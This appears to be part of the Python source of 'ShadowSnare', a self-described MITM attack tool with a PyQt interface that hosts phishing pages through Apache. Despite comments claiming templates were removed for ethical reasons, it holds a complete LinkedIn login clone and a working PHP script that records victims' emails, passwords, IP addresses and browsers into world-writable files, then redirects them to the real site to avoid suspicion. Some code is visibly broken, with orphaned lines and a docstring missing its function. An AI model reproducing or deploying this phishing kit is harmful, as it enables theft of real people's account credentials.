            subprocess.run(['sudo', 'chown', 'www-data:www-data', '/var/www/html/credentials.txt'], check=True)
            subprocess.run(['sudo', 'chown', 'www-data:www-data', '/var/www/html/credentials.json'], check=True)
            subprocess.run(['sudo', 'chmod', '666', '/var/www/html/credentials.txt'], check=True)
            subprocess.run(['sudo', 'chmod', '666', '/var/www/html/credentials.json'], check=True)
            
            self.capture_status_label.setText("✅ Capture system deployed")
            self.capture_status_label.setStyleSheet("color: #51cf66; font-weight: bold;")
            
            self.log_message("🔧 Credentials capture system deployed successfully", "SUCCESS")
            self.show_message("Deployment Success", "Credentials capture system deployed!\n\nFiles created:\n• /var/www/html/credentials.php\n• /var/www/html/credentials.txt\n• /var/www/html/credentials.json", "success")
            
        except Exception as e:
            error_msg = f"Failed to deploy capture system: {str(e)}"
            self.log_message(error_msg, "ERROR")
            self.show_message("Deployment Error", error_msg, "error")
    
    # Test functionality removed - keep it clean!
    # Users should create their own test files
            self.show_message("Test Form Created", "Test form created successfully!\n\nAccess it at: http://localhost/test.html\n\nUse any test credentials to verify the capture system works.", "success")
            
            # Open test page
            webbrowser.open("http://localhost/test.html")
            
        except Exception as e:
            error_msg = f"Failed to create test form: {str(e)}"
            self.log_message(error_msg, "ERROR")
            self.show_message("Test Error", error_msg, "error")
    
    def preview_current_page(self):
        """Preview the current page in /var/www/html/"""
        try:
            # Check if Apache is running
            result = subprocess.run(['sudo', 'systemctl', 'is-active', 'apache2'], capture_output=True, text=True)
            if result.returncode != 0:
                self.show_message("Apache Not Running", "Apache server is not running. Please start Apache first using the controls in MITM Engine tab.", "warning")
                return
            
            # Update Apache status
            self.apache_status_label.setText("✅ Apache server running")
            self.apache_status_label.setStyleSheet("color: #51cf66; font-weight: bold;")
            
            # Open current page
            webbrowser.open("http://localhost/")
            self.log_message("👁️ Previewing current page at http://localhost/", "INFO")
            
        except Exception as e:
            error_msg = f"Failed to preview page: {str(e)}"
            self.log_message(error_msg, "ERROR")
            self.show_message("Preview Error", error_msg, "error")
    
    # Logs Tab Methods
    def save_logs(self):
        """Save logs to file"""
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Logs", "shadowsnare_logs.txt", "Text files (*.txt)")
        if file_path:
            with open(file_path, 'w') as f:
                f.write(self.logs_display.toPlainText())
            self.log_message(f"Logs saved to {file_path}", "SUCCESS")
    
    def clear_logs(self):
        """Clear all logs"""
        self.logs_display.clear()
        self.log_message("Logs cleared", "INFO")
    
    # Fake Pages Tab Methods
    def preview_page(self):
        """Preview selected phishing page"""
        page_type = self.page_selector.currentText()
        self.log_message(f"Previewing {page_type}", "INFO")
        
        if "LinkedIn" in page_type:
            # Open browser to preview
            try:
                webbrowser.open("http://localhost/linkedin.html")
            except:
                self.log_message("Could not open browser for preview", "ERROR")
    
    def edit_html(self):
        """Edit HTML for phishing page"""
        page_type = self.page_selector.currentText()
        self.log_message(f"Opening HTML editor for {page_type}", "INFO")
        
        # Simple text editor dialog
        dialog = QDialog(self)
        dialog.setWindowTitle(f"Edit {page_type} HTML")
        dialog.setGeometry(200, 200, 800, 600)
        
        layout = QVBoxLayout()
        
        html_edit = QTextEdit()
        html_edit.setPlainText("<!-- Create your own HTML page here -->\n<!-- For ethical testing purposes only -->")
        layout.addWidget(html_edit)
        
        buttons = QHBoxLayout()
        save_btn = QPushButton("Save")
        save_btn.clicked.connect(lambda: self.save_html(html_edit.toPlainText(), page_type))
        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(dialog.close)
        
        buttons.addWidget(save_btn)
        buttons.addWidget(cancel_btn)
        layout.addLayout(buttons)
        
        dialog.setLayout(layout)
        dialog.exec_()
    
    def deploy_page(self):
        """Deploy phishing page to Apache"""
        page_type = self.page_selector.currentText()
        
        try:
            if "📁 Upload Custom Payload" in page_type:
                self.upload_custom_payload()
            elif "LinkedIn" in page_type:
                # html_content = self.get_responsive_linkedin_html()  # Removed for ethical reasons
                # php_content = self.get_credentials_php()  # Removed for ethical reasons
                
                self.show_message("Ethical Notice", "Pre-built templates removed for ethical reasons.\nPlease create your own test pages manually.", "warning")
                self.log_message("⚠️ Template deployment disabled - use manual page creation", "WARNING")
                return  # Exit early since templates are removed
                
                # Code below commented out for ethical reasons
                # Write HTML file
                # with open('/tmp/index.html', 'w') as f:
                #     f.write(html_content)
                
                # Write PHP credentials handler
                # with open('/tmp/credentials.php', 'w') as f:
                #     f.write(php_content)
                
                # Copy to Apache directory with sudo
                subprocess.run(['sudo', 'cp', '/tmp/index.html', '/var/www/html/'], check=True)
                subprocess.run(['sudo', 'cp', '/tmp/credentials.php', '/var/www/html/'], check=True)
                subprocess.run(['sudo', 'chown', 'www-data:www-data', '/var/www/html/index.html'], check=True)
                subprocess.run(['sudo', 'chown', 'www-data:www-data', '/var/www/html/credentials.php'], check=True)
                
                # Start Apache
                subprocess.run(['sudo', 'systemctl', 'start', 'apache2'], check=True)
                
                self.log_message(f"✅ {page_type} deployed successfully", "SUCCESS")
                self.log_message("🌐 Phishing page available at http://localhost", "INFO")
            else:
                self.log_message(f"⚠️ {page_type} not implemented yet", "WARNING")
                
        except Exception as e:
            self.log_message(f"Failed to deploy {page_type}: {str(e)}", "ERROR")
    
    def upload_custom_payload(self):
        """Upload and deploy custom payload"""
        file_dialog = QFileDialog(self)
        file_dialog.setStyleSheet(self.get_dialog_style())
        file_dialog.setWindowTitle("Select Custom Payload")
        file_dialog.setNameFilter("HTML files (*.html);;PHP files (*.php);;All files (*.*)")
        file_dialog.setFileMode(QFileDialog.ExistingFile)
        
        if file_dialog.exec_() == QDialog.Accepted:
            files = file_dialog.selectedFiles()
            if files:
                file_path = files[0]
                try:
                    # Read custom payload
                    with open(file_path, 'r') as f:
                        content = f.read()
                    
                    # Check if it's HTML or PHP
                    file_ext = file_path.lower().split('.')[-1]
                    target_name = 'index.html' if file_ext == 'html' else 'index.php'
                    
                    # Write to temp
                    with open(f'/tmp/{target_name}', 'w') as f:
                        f.write(content)
                    
                    # Deploy to Apache
                    subprocess.run(['sudo', 'cp', f'/tmp/{target_name}', '/var/www/html/'], check=True)
                    subprocess.run(['sudo', 'chown', 'www-data:www-data', f'/var/www/html/{target_name}'], check=True)
                    
                    # Start Apache
                    subprocess.run(['sudo', 'systemctl', 'start', 'apache2'], check=True)
                    
                    self.log_message(f"✅ Custom payload deployed successfully", "SUCCESS")
                    self.log_message(f"🌐 Custom payload available at http://localhost/{target_name}", "INFO")
                    
                    # Update selector to show active custom payload
                    self.page_selector.clear()
                    self.page_selector.addItems([
                        "🔄 Custom Payload (Active)",
                        "LinkedIn Login Clone",
                        "Facebook Login Clone", 
                        "Instagram Login Clone",
                        "PayPal Clone",
                        "📁 Upload Different Payload"
                    ])
                    
                    self.show_message("Deployment Success", f"Custom payload deployed successfully!\nAvailable at: http://localhost/{target_name}", "success")
                    
                except Exception as e:
                    error_msg = f"Failed to upload custom payload: {str(e)}"
                    self.log_message(error_msg, "ERROR")
                    self.show_message("Upload Error", error_msg, "error")
    
    def stop_hosting(self):
        """Stop hosting phishing pages"""
        try:
            subprocess.run(['sudo', 'systemctl', 'stop', 'apache2'], check=True)
            self.log_message("🛑 Apache server stopped", "WARNING")
        except Exception as e:
            self.log_message(f"Failed to stop Apache: {str(e)}", "ERROR")
    
    # HTML Templates removed for ethical reasons
    # Users should create their own test pages manually
    
    # Settings Tab Methods
        """Get responsive LinkedIn phishing page HTML with proper capturing"""
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn</title>
    <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIwLjQ0NyAyMC40NDJIMTYuODkzVjE0Ljg4N0MxNi44OTMgMTMuNTU1IDE2Ljg2NiAxMS44NDYgMTUuMDQxIDExLjg0NkMxMy4xODggMTEuODQ2IDEyLjkwNSAxMy4yOTEgMTIuOTA1IDE0Ljc4NVYyMC40NDJIOS4zNTFWOUg4Ljk5OFY5SDEyLjkwNVYxMC41NjFIMTIuOTU5QzEzLjQ1OSA5LjY5MSAxNC41NjggOS4wMzYgMTUuOTg2IDkuMDM2QzE5LjE3NyA5LjAzNiAyMC40NDcgMTEuMTEgMjAuNDQ3IDE0LjU4NVYyMC40NDJaIiBmaWxsPSIjMDA3N0I1Ii8+CjxwYXRoIGQ9Ik01LjMzNyA3LjQzM0M0LjI2IDcuNDMzIDMuMzg2IDYuNTU5IDMuMzg2IDUuNDgyQzMuMzg2IDQuNDA1IDQuMjYgMy41MyA1LjMzNyAzLjUzQzYuNDE0IDMuNTMgNy4yODggNC40MDUgNy4yODggNS40ODJDNC4yODggNi41NTkgNi40MTQgNy40MzMgNS4zMzcgNy40MzNaIiBmaWxsPSIjMDA3N0I1Ii8+CjxwYXRoIGQ9Ik03LjExOSAyMC40NDJIMy41NjNWOUg3LjExOVYyMC40NDJaIiBmaWxsPSIjMDA3N0I1Ii8+Cjwvc3ZnPg==">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            padding: 40px;
            width: 100%;
            max-width: 400px;
            animation: slideUp 0.6s ease-out;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: #0a66c2;
            font-size: 36px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        
        .logo .in {
            background: #0a66c2;
            color: white;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 32px;
        }
        
        .form-title {
            font-size: 28px;
            font-weight: 300;
            color: rgba(0,0,0,0.9);
            margin-bottom: 8px;
            text-align: center;
        }
        
        .form-subtitle {
            font-size: 16px;
            color: rgba(0,0,0,0.6);
            margin-bottom: 30px;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: rgba(0,0,0,0.9);
            font-weight: 600;
            font-size: 14px;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #fafafa;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #0a66c2;
            background: white;
            box-shadow: 0 0 0 3px rgba(10, 102, 194, 0.1);
        }
        
        .sign-in-btn {
            width: 100%;
            background: linear-gradient(45deg, #0a66c2, #004182);
            color: white;
            border: none;
            border-radius: 24px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .sign-in-btn:hover {
            background: linear-gradient(45deg, #004182, #0a66c2);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(10, 102, 194, 0.3);
        }
        
        .divider {
            text-align: center;
            margin: 20px 0;
            color: rgba(0,0,0,0.6);
            position: relative;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #e0e0e0;
            z-index: 1;
        }
        
        .divider span {
            background: white;
            padding: 0 15px;
            position: relative;
            z-index: 2;
        }
        
        .google-btn {
            width: 100%;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 24px;
            padding: 12px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .google-btn:hover {
            border-color: #ccc;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
            color: rgba(0,0,0,0.5);
        }
        
        .footer a {
            color: #0a66c2;
            text-decoration: none;
        }
        
        /* Responsive design */
        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                margin: 10px;
            }
            
            .logo h1 {
                font-size: 28px;
            }
            
            .form-title {
                font-size: 24px;
            }
            
            .form-group input {
                padding: 12px 14px;
                font-size: 14px;
            }
            
            .sign-in-btn {
                padding: 12px;
                font-size: 14px;
            }
        }
        
        @media (max-width: 360px) {
            .container {
                padding: 20px 15px;
            }
            
            .logo h1 {
                font-size: 24px;
            }
            
            .form-title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Linked<span class="in">in</span></h1>
        </div>
        
        <h1 class="form-title">Sign in</h1>
        <p class="form-subtitle">Stay updated on your professional world</p>
        
        <form action="credentials.php" method="POST" id="loginForm">
            <div class="form-group">
                <label for="email">Email or Phone</label>
                <input type="text" id="email" name="email" required autocomplete="username">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            
            <button type="submit" class="sign-in-btn">Sign in</button>
        </form>
        
        <div class="divider">
            <span>or</span>
        </div>
        
        <button class="google-btn" onclick="window.location.href='https://accounts.google.com/signin'">
            <svg width="18" height="18" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
            Continue with Google
        </button>
        
        <div class="footer">
            <a href="#">Forgot password?</a> • 
            <a href="#">Privacy Policy</a> • 
            <a href="#">User Agreement</a>
        </div>
    </div>
    
    <script>
        // Add some interactivity
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                e.preventDefault();
                alert('Please fill in all fields.');
                return false;
            }
            
            // Show loading state
            const btn = document.querySelector('.sign-in-btn');
            btn.innerHTML = 'Signing in...';
            btn.disabled = true;
        });
        
        // Add focus effects
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.classList.add('focused');
            });
            
            input.addEventListener('blur', function() {
                this.parentElement.classList.remove('focused');
            });
        });
    </script>
</body>
</html>'''
    
    def get_credentials_php(self):
        """Get enhanced PHP credentials capture script"""
        return '''<?php
// Enhanced credential capture script for ShadowSnare
error_reporting(0);
session_start();

// Get POST data
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// Get additional information
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

// Capture data if credentials provided
if (!empty($email) && !empty($password)) {
    // Format data
    $data = "[{$timestamp}] IP: {$ip} | Email: {$email} | Password: {$password} | User-Agent: {$user_agent} | Referer: {$referer}\\n";
    
    // Save to credentials file
    $credentials_file = '/var/www/html/credentials.txt';
    file_put_contents($credentials_file, $data, FILE_APPEND | LOCK_EX);
    
    // Also save as JSON for structured data
    $json_data = array(
        'timestamp' => $timestamp,
        'ip' => $ip,
        'email' => $email,
        'password' => $password,
        'user_agent' => $user_agent,
        'referer' => $referer,
        'service' => 'LinkedIn'
    );
    
    $json_file = '/var/www/html/credentials.json';
    $existing_data = file_exists($json_file) ? json_decode(file_get_contents($json_file), true) : array();
    $existing_data[] = $json_data;
    file_put_contents($json_file, json_encode($existing_data, JSON_PRETTY_PRINT));
    
    // Set permissions
    chmod($credentials_file, 0666);
    chmod($json_file, 0666);
}

// Redirect with delay to make it look more realistic
?>
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #f3f2ef;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0a66c2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            text-align: center;
            color: #666;
            margin-top: 20px;
        }
    </style>
    <script>
        setTimeout(function() {
            window.location.href = 'https://www.linkedin.com/feed/';
        }, 2000);
    </script>
</head>
<body>
    <div>
        <div class="loader"></div>
        <div class="message">
            <p>Verifying credentials...</p>
            <p>Redirecting to LinkedIn...</p>
        </div>
    </div>
</body>
</html>'''
    
    def save_html(self, content, page_type):
        """Save HTML content"""
        try:
            with open('/tmp/custom_page.html', 'w') as f:
                f.write(content)
            self.log_message(f"HTML for {page_type} saved", "SUCCESS")
        except Exception as e:
            self.log_message(f"Failed to save HTML: {str(e)}", "ERROR")
    
    # Settings Tab Methods
    def browse_dns_rules(self):
        """Browse for DNS rules file"""
        file_dialog = QFileDialog(self)
        file_dialog.setStyleSheet(self.get_dialog_style())
        file_dialog.setWindowTitle("Select DNS Rules File")
        file_dialog.setNameFilter("Text files (*.txt);;All files (*.*)")
        file_dialog.setFileMode(QFileDialog.ExistingFile)
        
        if file_dialog.exec_() == QDialog.Accepted:
            files = file_dialog.selectedFiles()
            if files:
                self.dns_rules_file.setText(files[0])
    
    def save_settings(self):
        """Save application settings"""
        try:
            settings = {
                'bettercap_path': self.bettercap_path.text(),
                'default_interface': self.default_interface.text(),
                'dns_rules_file': self.dns_rules_file.text(),
                'auto_start_mitm': self.auto_start_mitm.isChecked(),
                'enable_notifications': self.enable_notifications.isChecked()
            }
            
            import json
            with open('/tmp/shadowsnare_settings.json', 'w') as f:
                json.dump(settings, f, indent=2)
            
            self.log_message("⚙️ Settings saved successfully", "SUCCESS")
            
            # Reload interfaces with new default
            self.load_interfaces()
            
        except Exception as e:
            self.log_message(f"Failed to save settings: {str(e)}", "ERROR")
    
    def load_settings(self):
        """Load application settings"""
        try:
            import json
            with open('/tmp/shadowsnare_settings.json', 'r') as f:
                settings = json.load(f)
            
            self.bettercap_path.setText(settings.get('bettercap_path', '/usr/bin/bettercap'))
            self.default_interface.setText(settings.get('default_interface', 'wlan0'))
            self.dns_rules_file.setText(settings.get('dns_rules_file', ''))
            self.auto_start_mitm.setChecked(settings.get('auto_start_mitm', False))
            self.enable_notifications.setChecked(settings.get('enable_notifications', True))
            
        except:
            # Use defaults if no settings file
            pass

def main():
    app = QApplication(sys.argv)
    
    print("🚀 Starting ShadowSnare...")
    
    # Check for root privileges - MANDATORY
    if os.geteuid() != 0:
        print("❌ ERROR: ShadowSnare requires root privileges to function properly!")
        print("🔧 Please run with: sudo python3 shadowsnare.py")
        
        # Show error dialog with custom styling
        error_dialog = QMessageBox()
        error_dialog.setIcon(QMessageBox.Critical)
        error_dialog.setWindowTitle("Root Privileges Required")
        error_dialog.setText("ShadowSnare requires root privileges to:\n\n• Control network interfaces\n• Run bettercap for MITM attacks\n• Start/stop Apache server\n• Deploy phishing pages\n\nPlease run with: sudo python3 shadowsnare.py")
        error_dialog.setStyleSheet("""
            QMessageBox {
                background-color: #1a1a1a;
                color: #ffffff;
            }
            QMessageBox QLabel {
                color: #ffffff !important;
                font-size: 14px;
                background-color: transparent;
            }
            QMessageBox QPushButton {
                background-color: #2d2d2d;
                color: #ffffff;
                border: 1px solid #ff6b6b;
                border-radius: 6px;
                padding: 8px 16px;
                min-width: 80px;
            }
            QMessageBox QPushButton:hover {
                background-color: #ff6b6b;
                color: #000000;
            }
            * {
                color: #ffffff;
            }
        """)
        
        # Force white text on all labels after creation
        def force_labels_white():
            for label in error_dialog.findChildren(QLabel):
                label.setStyleSheet("color: #ffffff !important; background-color: transparent; font-size: 14px;")
        
        QTimer.singleShot(50, force_labels_white)
        error_dialog.exec_()
        sys.exit(1)
    else:
        print("✅ Running with root privileges")
    
    # Create and show main window directly
    window = ShadowSnareGUI()
    window.show()
    
    print("✅ ShadowSnare GUI loaded successfully!")
    
    # Initial log messages
    window.log_message("ShadowSnare initialized successfully", "SUCCESS")
    window.log_message("Welcome to ShadowSnare - Advanced MITM Attack Tool", "INFO")
    window.log_message("Developed by Team PORT:443 for Educational Purposes Only", "INFO")
    window.log_message("⚠️ Root privileges detected - Full functionality enabled", "SUCCESS")
    
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
